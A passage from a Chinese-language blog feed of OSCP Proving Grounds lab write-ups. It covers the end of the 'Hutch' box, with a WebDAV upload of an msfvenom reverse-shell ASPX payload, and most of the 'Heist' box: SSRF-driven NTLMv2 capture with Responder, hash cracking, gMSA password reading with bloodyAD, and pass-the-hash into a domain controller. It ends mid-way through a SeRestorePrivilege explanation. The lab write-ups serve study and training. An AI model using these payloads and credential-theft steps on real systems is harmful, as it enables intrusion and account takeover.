class="number">.173</span><span class="number">.122</span>.....</span><br><span class="line"><span class="punctuation">[</span>*<span class="punctuation">]</span> Starting service rdga.....</span><br><span class="line"><span class="punctuation">[</span>!<span class="punctuation">]</span> Press help for extra shell commands</span><br><span class="line">Microsoft Windows <span class="punctuation">[</span>Version <span class="number">10.0</span><span class="number">.17763</span><span class="number">.1637</span><span class="punctuation">]</span></span><br><span class="line">(c) <span class="number">2018</span> Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C<span class="punctuation">:</span>\Windows\system32&gt; cd /users/administrator/desktop</span><br><span class="line"></span><br><span class="line">C<span class="punctuation">:</span>\Users\Administrator\Desktop&gt; type proof.txt</span><br><span class="line"><span class="number">9</span>f82db6474daaff56457112b4c76693c</span><br></pre></td></tr></table></figure>

<h1 id="cadaver"><a href="#cadaver" class="headerlink" title="cadaver"></a>cadaver</h1><blockquote>
<p><a href="https://juggernaut-sec.com/proving-grounds-hutch/">https://juggernaut-sec.com/proving-grounds-hutch/</a> 给出了使用cadaver上传webshell的方式，但是我测试无法利用成功，可能offsec修复了这个漏洞</p>
</blockquote>
<p><em>webdav: 基于Web的分布式编写和版本控制（英语：Web-based Distributed Authoring and Versioning，缩写：WebDAV）是超文本传输协议（HTTP）的扩展，有利于用户间协同编辑和管理存储在万维网服务器文档</em></p>
<p>80端口webdav</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">echo <span class="string">&quot;ass&quot;</span> &gt; test.txt</span><br><span class="line"></span><br><span class="line">cadaver http<span class="punctuation">:</span><span class="comment">//192.168.173.122</span></span><br><span class="line">Authentication required for <span class="number">192.168</span><span class="number">.173</span><span class="number">.122</span> on server `<span class="number">192.168</span><span class="number">.173</span><span class="number">.122</span>&#x27;<span class="punctuation">:</span></span><br><span class="line">Username<span class="punctuation">:</span> fmcsorley</span><br><span class="line">Password<span class="punctuation">:</span></span><br><span class="line">dav<span class="punctuation">:</span>/&gt; put test.txt</span><br><span class="line">Uploading test.txt to `/test.txt&#x27;<span class="punctuation">:</span></span><br><span class="line">Progress<span class="punctuation">:</span> <span class="punctuation">[</span>=============================&gt;<span class="punctuation">]</span> <span class="number">100.0</span>% of <span class="number">4</span> bytes succeeded.</span><br></pre></td></tr></table></figure>

<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">curl http<span class="punctuation">:</span><span class="comment">//192.168.173.122/test.txt</span></span><br><span class="line">ass</span><br></pre></td></tr></table></figure>

<p>反弹shell</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.45</span><span class="number">.169</span> LPORT=<span class="number">443</span> -f aspx &gt; r.aspx</span><br></pre></td></tr></table></figure>

<p>上传</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">dav<span class="punctuation">:</span>/&gt; put r.aspx</span><br></pre></td></tr></table></figure>

<p>然后利用 SeimpersonatePrivilege提权</p>
]]></content>
      <categories>
        <category>What We Do-三天打鱼</category>
        <category>OSCP</category>
        <category>PG Lab</category>
      </categories>
  </entry>
  <entry>
    <title>Proving Grounds Practice - Heist</title>
    <url>/post/20250304004106.html</url>
    <content><![CDATA[<h1 id="Difficulty"><a href="#Difficulty" class="headerlink" title="Difficulty"></a>Difficulty</h1><p>Hard</p>
<h1 id="Scan"><a href="#Scan" class="headerlink" title="Scan"></a>Scan</h1><h2 id="autorecon-192-168-149-165"><a href="#autorecon-192-168-149-165" class="headerlink" title="autorecon 192.168.149.165"></a>autorecon 192.168.149.165</h2><p><img data-src="https://thiiiiink.com/202508/asynccode-6.png.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[*] domain found on tcp/53.</span><br><span class="line">    dns domain</span><br><span class="line"></span><br><span class="line">[*] kerberos-sec found on tcp/88.</span><br><span class="line">    kerberos-sec</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] msrpc found on tcp/135.</span><br><span class="line"></span><br><span class="line">[*] netbios-ssn found on tcp/139.</span><br><span class="line"></span><br><span class="line">[*] ldap found on tcp/389. / 3268 </span><br><span class="line">    heist.offsec</span><br><span class="line">    rootDomainNamingContext: DC=heist,DC=offsec</span><br><span class="line">|   ldapServiceName: heist.offsec:dc01$@HEIST.OFFSEC</span><br><span class="line"></span><br><span class="line">[*] microsoft-ds found on tcp/445.</span><br><span class="line">    SMB 3.0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] kpasswd5 found on tcp/464.</span><br><span class="line"></span><br><span class="line">[*] ncacn_http found on tcp/593.</span><br><span class="line"></span><br><span class="line">[*] ms-wbt-server found on tcp/3389.</span><br><span class="line">    commonName=DC01.heist.offsec</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] http found on tcp/8080.</span><br><span class="line">    Server: Werkzeug/2.0.1 Python/3.9.0</span><br><span class="line"></span><br><span class="line">    ssrf</span><br><span class="line">    http://192.168.149.165:8080/?url=http://localhost:8080</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] tcpwrapped found on tcp/636.</span><br><span class="line"></span><br><span class="line">[*] tcpwrapped found on tcp/3269.</span><br><span class="line"></span><br><span class="line">[*] wsman found on tcp/5985.</span><br><span class="line">    WinRM</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] mc-nmf found on tcp/9389.</span><br><span class="line"></span><br><span class="line">[*] msrpc found on tcp/49666.</span><br><span class="line">[*] msrpc found on tcp/49667.</span><br><span class="line">[*] ncacn_http found on tcp/49673.</span><br><span class="line">[*] msrpc found on tcp/49674.</span><br><span class="line">[*] msrpc found on tcp/49677</span><br><span class="line">[*] msrpc found on tcp/49704.</span><br><span class="line">[*] msrpc found on tcp/49786.</span><br><span class="line"></span><br><span class="line">[*] domain found on udp/53.</span><br><span class="line"></span><br><span class="line">[*] kerberos-sec found on udp/88.</span><br><span class="line"></span><br><span class="line">[*] ntp found on udp/123.</span><br></pre></td></tr></table></figure>

<h2 id="domain-dig"><a href="#domain-dig" class="headerlink" title="domain dig"></a>domain dig</h2><p>首先添加heist.offsec和dc1.heist.offsec到 &#x2F;etc&#x2F;hosts中，</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dig @<span class="number">192.168</span><span class="number">.149</span><span class="number">.165</span> AXFR heist.offsec</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG <span class="number">9.20</span><span class="number">.2</span>-<span class="number">1</span>-Debian &lt;&lt;&gt;&gt; @<span class="number">192.168</span><span class="number">.149</span><span class="number">.165</span> AXFR heist.offsec</span><br><span class="line">; (<span class="number">1</span> server found)</span><br><span class="line">;; <span class="keyword">global</span> options: +cmd</span><br><span class="line">; Transfer failed.</span><br></pre></td></tr></table></figure>

<h2 id="rpcclient"><a href="#rpcclient" class="headerlink" title="rpcclient"></a>rpcclient</h2><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">rpcclient 192.168.149.165 -N</span><br><span class="line">Cannot connect to server.  Error was NT<span class="emphasis">_STATUS_</span>LOGON<span class="emphasis">_FAILURE</span></span><br></pre></td></tr></table></figure>

<h2 id="smbclient"><a href="#smbclient" class="headerlink" title="smbclient"></a>smbclient</h2><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">smbclient -L //192.168.149.165 -N</span><br><span class="line">session setup failed: NT<span class="emphasis">_STATUS_</span>ACCESS<span class="emphasis">_DENIED</span></span><br><span class="line"><span class="emphasis">                         </span></span><br></pre></td></tr></table></figure>

<h2 id="ldapsearch"><a href="#ldapsearch" class="headerlink" title="ldapsearch"></a>ldapsearch</h2><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">ldapsearch</span> <span class="string">-H</span> <span class="string">ldap://192.168.149.165</span> <span class="string">-x</span> <span class="string">-b</span> <span class="string">&quot;DC=offsec,DC=heist&quot;</span> <span class="string">|tee</span> <span class="string">ldap_dump</span></span><br><span class="line"><span class="comment"># extended LDIF</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># LDAPv3</span></span><br><span class="line"><span class="comment"># base &lt;DC=offsec,DC=heist&gt; with scope subtree</span></span><br><span class="line"><span class="comment"># filter: (objectclass=*)</span></span><br><span class="line"><span class="comment"># requesting: ALL</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># search result</span></span><br><span class="line"><span class="attr">search:</span> <span class="number">2</span></span><br><span class="line"><span class="attr">result:</span> <span class="number">1</span> <span class="string">Operations</span> <span class="string">error</span></span><br><span class="line"><span class="attr">text: 000004DC: LdapErr:</span> <span class="string">DSID-0C090A5C,</span> <span class="attr">comment:</span> <span class="string">In</span> <span class="string">order</span> <span class="string">to</span> <span class="string">perform</span> <span class="string">this</span> <span class="string">opera</span></span><br><span class="line"> <span class="string">tion</span> <span class="string">a</span> <span class="string">successful</span> <span class="string">bind</span> <span class="string">must</span> <span class="string">be</span> <span class="string">completed</span> <span class="string">on</span> <span class="string">the</span> <span class="string">connection.,</span> <span class="string">data</span> <span class="number">0</span><span class="string">,</span> <span class="string">v4563</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># numResponses: 1</span></span><br></pre></td></tr></table></figure>

<h2 id="8080"><a href="#8080" class="headerlink" title="8080"></a>8080</h2><h3 id="whatweb"><a href="#whatweb" class="headerlink" title="whatweb"></a>whatweb</h3><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">whatweb -a 3 http://192.168.149.165:8080</span><br><span class="line">http://192.168.149.165:8080 [<span class="string">200 OK</span>] Bootstrap[<span class="string">3.3.6</span>], Country[<span class="string">RESERVED</span>][<span class="symbol">ZZ</span>], HTML5, HTTPServer[Werkzeug/2.0.1 Python/3.9.0], IP[192.168.149.165], JQuery[2.2.2], Python[3.9.0], Script, Title[Super Secure Web Browser], Werkzeug[2.0.1]</span><br><span class="line"><span class="code">                                     </span></span><br></pre></td></tr></table></figure>

<h3 id="gobuster"><a href="#gobuster" class="headerlink" title="gobuster"></a>gobuster</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -w /usr/share/wordlists/dirb/big.txt -u http://192.168.149.165:8080 -t 40</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.6</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.149.165:8080</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 40</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirb/big.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.6</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster <span class="keyword">in</span> directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">Progress: 20469 / 20470 (100.00%)</span><br><span class="line">===============================================================</span><br><span class="line">Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<h3 id="ssrf-vuln"><a href="#ssrf-vuln" class="headerlink" title="ssrf vuln"></a>ssrf vuln</h3><p>访问 <code>http://192.168.149.165:8080/</code>页面如下，只有一个输入框，提示输入一个url, 输入 <code>http://192.168.149.165:8080/</code></p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-10.png.png"></p>
<p>还是同一个页面，确定是ssrf漏洞.</p>
<h1 id="Foothold"><a href="#Foothold" class="headerlink" title="Foothold"></a>Foothold</h1><h2 id="Responder"><a href="#Responder" class="headerlink" title="Responder"></a>Responder</h2><p>截止目前我们还没有得到任何和用户相关的信息，如果可以窃取到NTLMV2 hash的话，就有了突破口，接下来使用 <code>responder</code>窃取handshake时的hash</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-9.png.png"></p>
<p>kali启动responser, 输入框内输入kali的80端口地址 <code>http://192.168.45.165/</code>， 获取到了 NTLM V2 hash</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> responder -I tun0 -wv</span><br><span class="line">[<span class="built_in">sudo</span>] password <span class="keyword">for</span> kali: </span><br><span class="line">                                         __</span><br><span class="line">  .----.-----.-----.-----.-----.-----.--|  |.-----.----.</span><br><span class="line">  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|</span><br><span class="line">  |__| |_____|_____|   __|_____|__|__|_____||_____|__|</span><br><span class="line">                   |__|</span><br><span class="line"></span><br><span class="line">           NBT-NS, LLMNR &amp; MDNS Responder 3.1.5.0</span><br><span class="line"></span><br><span class="line">  To support this project:</span><br><span class="line">  Github -&gt; https://github.com/sponsors/lgandx</span><br><span class="line">  Paypal  -&gt; https://paypal.me/PythonResponder</span><br><span class="line"></span><br><span class="line">  Author: Laurent Gaffie (laurent.gaffie@gmail.com)</span><br><span class="line">  To <span class="built_in">kill</span> this script hit CTRL-C</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Poisoners:</span><br><span class="line">    LLMNR                      [ON]</span><br><span class="line">    NBT-NS                     [ON]</span><br><span class="line">    MDNS                       [ON]</span><br><span class="line">    DNS                        [ON]</span><br><span class="line">    DHCP                       [OFF]</span><br><span class="line"></span><br><span class="line">[+] Servers:</span><br><span class="line">    HTTP server                [ON]</span><br><span class="line">    HTTPS server               [ON]</span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">[+] Listening <span class="keyword">for</span> events...</span><br><span class="line"></span><br><span class="line">[!] Error starting TCP server on port 3389, check permissions or other servers running.</span><br><span class="line">[HTTP] Sending NTLM authentication request to 192.168.149.165</span><br><span class="line">[HTTP] GET request from: ::ffff:192.168.149.165  URL: / </span><br><span class="line">[HTTP] NTLMv2 Client   : 192.168.149.165</span><br><span class="line">[HTTP] NTLMv2 Username : HEIST\enox</span><br><span class="line">[HTTP] NTLMv2 Hash     : enox::HEIST:c22b3ec3fb2f7638:2F5E57D00CCDFDF244D34A4A120C58F9:0101000000000000D2CF76FF388CDB01ED4B9EE32A689CD900000000020008004A004E003300460001001E00570049004E002D005200440055004200540058005A005000390049004500040014004A004E00330046002E004C004F00430041004C0003003400570049004E002D005200440055004200540058005A0050003900490045002E004A004E00330046002E004C004F00430041004C00050014004A004E00330046002E004C004F00430041004C00080030003000000000000000000000000030000098BF0D68BEA36AC69F27F02B4B5580B35A970EAA12F2C2D466BA29E944A8C58C0A001000000000000000000000000000000000000900260048005400540050002F003100390032002E003100360038002E00340035002E003100360035000000000000000000</span><br></pre></td></tr></table></figure>

<p>既然有了hash,接下来就是破解了 <code>hashcat -m 5600 enox.hash /usr/share/wordlist/rockyou.txt</code>, 得到密码 <code>enox:california</code></p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-11.png.png"></p>
<p>接下来使用密码通过3389登录rdp, 登录失败</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">xfreerdp +clipboard /u:enox /p:california /v:192.168.149.165 /d:heist.offsec</span><br><span class="line">[00:07:24:582] [2881148:2881151] [WARN][com.freerdp.crypto] - Certificate verification failure <span class="string">&#x27;self-signed certificate (18)&#x27;</span> at stack position 0</span><br><span class="line">[00:07:24:582] [2881148:2881151] [WARN][com.freerdp.crypto] - CN = DC01.heist.offsec</span><br><span class="line">[00:07:24:200] [2881148:2881151] [ERROR][com.freerdp.core.transport] - BIO_read returned a system error 104: Connection reset by peer</span><br><span class="line">[00:07:24:200] [2881148:2881151] [ERROR][com.freerdp.core] - transport_read_layer:freerdp_set_last_error_ex ERRCONNECT_CONNECT_TRANSPORT_FAILED [0x0002000D]</span><br><span class="line">[00:07:26:808] [2881148:2881151] [ERROR][com.freerdp.core.transport] - BIO_read returned a system error 104: Connection reset by peer</span><br><span class="line">[00:07:26:808] [2881148:2881151] [ERROR][com.freerdp.core] - transport_read_layer:freerdp_set_last_error_ex ERRCONNECT_CONNECT_TRANSPORT_FAILED [0x0002000D]</span><br><span class="line">[00:07:26:808] [2881148:2881151] [ERROR][com.freerdp.core] - freerdp_post_connect failed</span><br></pre></td></tr></table></figure>

<p>登录smb,没有得到什么有用信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smbclient -L //192.168.149.165 -U enox</span><br><span class="line">Password <span class="keyword">for</span> [WORKGROUP\enox]:</span><br><span class="line"></span><br><span class="line">        Sharename       Type      Comment</span><br><span class="line">        ---------       ----      -------</span><br><span class="line">        ADMIN$          Disk      Remote Admin</span><br><span class="line">        C$              Disk      Default share</span><br><span class="line">        IPC$            IPC       Remote IPC</span><br><span class="line">        NETLOGON        Disk      Logon server share </span><br><span class="line">        SYSVOL          Disk      Logon server share </span><br><span class="line">Reconnecting with SMB1 <span class="keyword">for</span> workgroup listing.</span><br><span class="line">do_connect: Connection to 192.168.149.165 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)</span><br><span class="line">Unable to connect with SMB1 -- no workgroup available</span><br><span class="line">                                     </span><br><span class="line">smbclient //192.168.149.165/netlogon -U enox</span><br><span class="line">Password <span class="keyword">for</span> [WORKGROUP\enox]:</span><br><span class="line">Try <span class="string">&quot;help&quot;</span> to get a list of possible commands.</span><br><span class="line">smb: \&gt; <span class="built_in">ls</span></span><br><span class="line">  .                                   D        0  Tue Jul 20 19:01:21 2021</span><br><span class="line">  ..                                  D        0  Tue Jul 20 19:01:21 2021</span><br><span class="line"></span><br><span class="line">                7706623 blocks of size 4096. 3249419 blocks available</span><br><span class="line">smb: \&gt; <span class="built_in">exit</span></span><br><span class="line">                                                                                                                                             </span><br><span class="line">smbclient //192.168.149.165/sysvol -U enox</span><br><span class="line">Password <span class="keyword">for</span> [WORKGROUP\enox]:</span><br><span class="line">Try <span class="string">&quot;help&quot;</span> to get a list of possible commands.</span><br><span class="line">smb: \&gt; <span class="built_in">ls</span></span><br><span class="line">  .                                   D        0  Tue Jul 20 19:01:21 2021</span><br><span class="line">  ..                                  D        0  Tue Jul 20 19:01:21 2021</span><br><span class="line">  heist.offsec                       Dr        0  Tue Jul 20 19:01:21 2021</span><br><span class="line"></span><br><span class="line">                7706623 blocks of size 4096. 3249419 blocks available</span><br><span class="line">smb: \&gt; <span class="built_in">cd</span> heist.offsec</span><br><span class="line">smb: \heist.offsec\&gt; <span class="built_in">ls</span></span><br><span class="line">  .                                   D        0  Tue Jul 20 19:07:47 2021</span><br><span class="line">  ..                                  D        0  Tue Jul 20 19:07:47 2021</span><br><span class="line">  DfsrPrivate                      DHSr        0  Tue Jul 20 19:07:47 2021</span><br><span class="line">  Policies                            D        0  Tue Jul 20 19:01:30 2021</span><br><span class="line">  scripts                             D        0  Tue Jul 20 19:01:21 2021</span><br></pre></td></tr></table></figure>

<p>evil-winrm 登录成功</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">evil-winrm -i 192.168.149.165 -u enox -p california</span><br><span class="line">                                      </span><br><span class="line">Evil-WinRM shell v3.5</span><br><span class="line">                                      </span><br><span class="line">Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() <span class="keyword">function</span> is unimplemented on this machine</span><br><span class="line">                                      </span><br><span class="line">Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion</span><br><span class="line">                                      </span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line">*Evil-WinRM* PS C:\Users\enox\Documents&gt; <span class="built_in">ls</span></span><br><span class="line">*Evil-WinRM* PS C:\Users\enox\Documents&gt; <span class="built_in">cd</span> ..</span><br></pre></td></tr></table></figure>

<h1 id="Escalation"><a href="#Escalation" class="headerlink" title="Escalation"></a>Escalation</h1><p>在enox&#x2F;desktop文件夹下发现todo.txt</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-12.png.png"></p>
<p>然后在&#x2F;users 目录下发现有svc_apache$用户，可能是一个利用点</p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-5.png.png"></p>
<p>常规收集enox用户权限、运行进程、serivce都没有收货，运行winpeas一样没有得到提权有用的信息。不过既然是AD，就要上传SharpHound.ps1收集一下域相关信息</p>
<h2 id="bloodhound"><a href="#bloodhound" class="headerlink" title="bloodhound"></a>bloodhound</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\<span class="built_in">users</span>\enox&gt; . .\sharphound.ps1</span><br><span class="line">*Evil-WinRM* PS C:\<span class="built_in">users</span>\enox&gt; invoke-bloodhound -collectionmethod all -outputprefix <span class="string">&quot;audit&quot;</span> -outputdirectory <span class="string">&quot;/users/enox&quot;</span></span><br><span class="line">*Evil-WinRM* PS C:\Users\enox&gt; download audit_20250303064734_BloodHound.zip</span><br><span class="line">                                      </span><br><span class="line">Info: Downloading C:\Users\enox\audit_20250303064734_BloodHound.zip to audit_20250303064734_BloodHound.zip</span><br><span class="line">                                      </span><br><span class="line">Info: Download successful!</span><br></pre></td></tr></table></figure>

<p><img data-src="https://thiiiiink.com/202508/asynccode-4.png.png"></p>
<p><img data-src="https://thiiiiink.com/202508/asynccode-7.png.png"></p>
<h2 id="ReadGMSAPassword"><a href="#ReadGMSAPassword" class="headerlink" title="ReadGMSAPassword"></a>ReadGMSAPassword</h2><p>BloodHound 中看到enox用户所属WEB ADMINS有对SVC_APACH$有ReadGMSAPassword权限</p>
<blockquote>
<p>“ReadGMSAPassword”通常指的是一种权限或能力，允许某个账户读取Active Directory中组管理服务账户（gMSA）的密码。gMSA是Windows Server 2012引入的一种特殊服务账户类型，用于自动化密码管理，广泛应用于域环境中的服务和应用程序。</p>
<p><strong>gMSA的特点</strong>：</p>
<p>密码由域控制器（DC）自动生成和管理（240字节随机密码）。</p>
<p>默认每30天自动轮换一次（可配置）。</p>
<p>允许多台主机使用同一账户运行服务，解决了传统MSA（Managed Service Account）只能绑定单机的限制。</p>
<p>密码存储在AD对象的 msDS-ManagedPassword 属性中。</p>
<p><strong>ReadGMSAPassword 的含义</strong>：</p>
<p>在AD中，gMSA的密码访问权限由 msDS-GroupMSAMembership 属性控制，该属性定义了哪些安全主体（用户、组或计算机）可以读取密码。</p>
<p>如果一个账户拥有“ReadGMSAPassword”权限（通常表现为 RIGHT_DS_READ_PROPERTY 访问控制权限），它可以提取gMSA的当前密码。</p>
</blockquote>
<p>那么接下来就是获取svc_apache$的密码信息了</p>
<p>测试bloodhound中给出的<a href="https://github.com/micahvandeusen/gMSADumper">gMSADumper.py</a>, 执行后只是列出来who can read， 这些是我们已经知道的了。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python gMSADumper.py -u enox -p california -d heist.offsec</span><br><span class="line">Unable to start a TLS connection. Is LDAPS enabled? Only ACLs will be listed and not ms-DS-ManagedPassword.</span><br><span class="line"></span><br><span class="line">Users or <span class="built_in">groups</span> <span class="built_in">who</span> can <span class="built_in">read</span> password <span class="keyword">for</span> svc_apache$:</span><br><span class="line"> &gt; DC01$</span><br><span class="line"> &gt; Web Admins</span><br><span class="line">               </span><br></pre></td></tr></table></figure>

<p>搜索一下 <code>readgmsa password</code>找到下面的链接：</p>
<p><code>https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword</code></p>
<blockquote>
<p>bloodyAD： <a href="https://github.com/CravateRouge/bloodyAD">https://github.com/CravateRouge/bloodyAD</a></p>
</blockquote>
<p><img data-src="https://thiiiiink.com/202508/asynccode-8.png.png"></p>
<p>成功读取到ntlm hash:<code>0c43e5ad6bc9104cfb94d56f4aecb4ab</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./bloodyAD.py --host 192.168.149.165 -d heist.offsec -u enox -p california get object svc_apache$ --attr msDS-ManagedPassword</span><br><span class="line"></span><br><span class="line">distinguishedName: CN=svc_apache,CN=Managed Service Accounts,DC=heist,DC=offsec</span><br><span class="line">msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:0c43e5ad6bc9104cfb94d56f4aecb4ab</span><br><span class="line">msDS-ManagedPassword.B64ENCODED: b8iUgZTAehetubX0QcQQoLkmMSjGS7MXKpta94CcZvY4hej/0kCetCW0BVRtyfpubMbV/SECcA0VvsH2dvzZjsna1RLixNOQEedehbIpHdPFmvVcgwl30oBm2/+HJ8p0ox2VYjB/bjTx3VLiInMHzriTIlFLAL/j7feKC383nDPSpyUnfza62KJFYBHcQA//XGJ9rcl33pTN1IdYeEpzOcNzmca2QRdtIbBLpDTsRceO0qafC8a1yYkDtmfC1JmZxG9T3BopaW8Xl1Jjc1hTUDr9rAtGuUCSDCrTY50hI2B9HzkMXoAzPVz0L7amoE0X4QPNtGWDrM4+fg3//AUARw==</span><br><span class="line">  </span><br></pre></td></tr></table></figure>

<h2 id="Pass-The-Hash"><a href="#Pass-The-Hash" class="headerlink" title="Pass The Hash"></a>Pass The Hash</h2><p>查看svc_apache$权限： SeRestorePrivilege</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">evil<span class="operator">-</span>winrm <span class="operator">-</span>i <span class="number">192.168</span><span class="number">.149</span><span class="number">.165</span> <span class="operator">-</span>u &quot;svc_apache$&quot; <span class="operator">-</span>H &quot;0c43e5ad6bc9104cfb94d56f4aecb4ab&quot;</span><br><span class="line">                                      </span><br><span class="line">Evil<span class="operator">-</span>WinRM shell v3<span class="number">.5</span></span><br><span class="line">                                      </span><br><span class="line">Warning: Remote path completions <span class="keyword">is</span> disabled due <span class="keyword">to</span> ruby limitation: quoting_detection_proc() <span class="keyword">function</span> <span class="keyword">is</span> unimplemented <span class="keyword">on</span> this machine</span><br><span class="line">                                      </span><br><span class="line">Data: <span class="keyword">For</span> more information, <span class="keyword">check</span> Evil<span class="operator">-</span>WinRM GitHub: https:<span class="operator">/</span><span class="operator">/</span>github.com<span class="operator">/</span>Hackplayers<span class="operator">/</span>evil<span class="operator">-</span>winrm#Remote<span class="operator">-</span>path<span class="operator">-</span>completion</span><br><span class="line">                                      </span><br><span class="line">Info: Establishing connection <span class="keyword">to</span> remote endpoint</span><br><span class="line"><span class="operator">*</span>Evil<span class="operator">-</span>WinRM<span class="operator">*</span> PS C:\Users\svc_apache$\Documents<span class="operator">&gt;</span> ls</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\svc_apache$\Documents</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line"><span class="comment">----                -------------         ------ ----</span></span><br><span class="line"><span class="operator">-</span>a<span class="comment">----        9/14/2021   8:27 AM           3213 EnableSeRestorePrivilege.ps1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="operator">*</span>Evil<span class="operator">-</span>WinRM<span class="operator">*</span> PS C:\Users\svc_apache$\Documents<span class="operator">&gt;</span> whoami <span class="operator">/</span>priv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line"><span class="comment">----------------------</span></span><br><span class="line"></span><br><span class="line">Privilege Name                Description                    State</span><br><span class="line"><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span> <span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span> <span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line">SeMachineAccountPrivilege     <span class="keyword">Add</span> workstations <span class="keyword">to</span> domain     Enabled</span><br><span class="line">SeRestorePrivilege            Restore files <span class="keyword">and</span> directories  Enabled</span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking       Enabled</span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working <span class="keyword">set</span> Enabled</span><br></pre></td></tr></table></figure>

<h2 id="SeRestorPrivilege"><a href="#SeRestorPrivilege" class="headerlink" title="SeRestorPrivilege"></a>SeRestorPrivilege</h2><blockquote>
<p>SeRestorePrivilege 是 Windows 操作系统中的一种特权（Privilege），全称是 **”Restore files and directories”**（恢复文件和目录）。它属于安全特权的一部分，通常由系统管理员或高权限账户持有，用于执行涉及系统级恢复或修改的操作。</p>
<ul>
<li>通常授予 <strong>Administrators</strong> 组（本地管理员）。</li>
<li>在域环境中，可能由 <strong>Domain Admins</strong> 或特定服务账户（如备份服务）持有。</li>
<li>默认情况下，非管理员用户不具备此特权。</li>
</ul>
<p>可以做什么：</p>
<ol>
<li><p><strong>绕过文件权限</strong>：</p>
<ol start="2">
<li>无视文件或目录的ACL，直接写入或覆盖内容。</li>
<li>示例：即使文件只允许“SYSTEM”写入，拥有此特权的用户也能修改它。</li>
</ol>
</li>
<li><p><strong>修改注册表</strong>：</p>
<ol start="3">
<li>包括受限的注册表键（如 HKEY_LOCAL_MACHINE\SAM、HKEY_LOCAL_MACHINE\SECURITY）。</li>
